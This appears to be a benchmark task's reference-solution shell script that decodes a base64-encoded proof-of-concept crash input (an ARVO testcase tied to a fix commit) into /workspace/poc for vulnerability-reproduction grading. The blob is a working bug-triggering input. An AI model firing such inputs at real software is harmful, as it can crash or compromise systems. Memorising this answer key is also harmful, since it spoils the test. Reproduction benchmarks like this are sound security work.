#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 243274a8 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
AFaqAAADAAAC/wAAAgEAAf8BAOcAAADb/wAA//////8BAAAAAAAAEvgGAgAAAYAhAAAAAAAAAACG/gAAAQAAAPaEhP8CAP98///5egDoaOgKAQAAF+IA6Rvo6OgAAKfo6Ojo6IXo6Ojo6C8A+np6enr////////////////////o6Ojo6AD6enrde/////////////////////////f/////////6Ojo6OgA+np6enr//23/////////////////////////////f/8A6OmEhJsIQY9denqEPYR6////CP//hAAAAAD/AAAAAAAAAQAAAKysrKysrKwAAAAArAAAAQAAAOaEhP8CAP9Vqv/5egDo6OgKAf8I//+BAD96qlUBAAAABAAAAgEAAf8A/////////wEA////////////////6PgGAgAAAYAhAAAAAAD/////AP//AAAAAAEAAAAArKysrKysAKysenp6/3r//////////////////+jo6OjoAPp6enp6/////////////z//6Ojo6OgA+np6enr/////////3//////////o6OgKAf8I//+B/////wD//wAAAAABAAAArKyE////CP//hAAAAAMA/wAAAAAAAAMAAAAAAP////+srKysqKysrAAAAAAAbwEAAADmhIT/AgD/Var/+XoA//8I/4QAAAAAAP8AAACvrAAAAAAAQQABAAAA5oSE//n/AKpVAAaFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/////Jv//6Ojo6Ojo//////////////7o6OgA+np6enr//////////+jo6OjoAPp6enp6/////////d//////////APp6enp6AP8AAAAAAAABAAAArKysrKysrKwlAAAAAAABAC3phISbCEGPXXp6hD2Eev///wj/6Ojo6Kfo6Ojo6IXo6Ojo6OgA+np6ev96//8B/wj//4QAAAAA/wAAAPp6enp6////////////APUAAAABAAACEAAAAgEAIQD1AAAAAQAAAAQAAAIBAAH/AAAAAAAAAAAAAP///////////////+j4BgIAAAGAIQAAAAAAAAAAhv4AAAEAAAABe4T/AgD/fP+n6ADo6OiF6Ojo6Hp6ev////////3f/////////wD6enp6egD/AAAAAAAAAgAAAKysrKysrKysJQAAAAAAAQAt6YSbCEGPXXp6hD2Eev///wj/6Ojo6Kfo6Ojo6IXo6Ojo6OgA+np6ev96//8AAAAAAAIAAACsrKysrKysrCUAAAAAAAEALemEmwhBj116eoQ9hHr///8I/+jo6Oin6Ojohejo6Ojo6P8=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
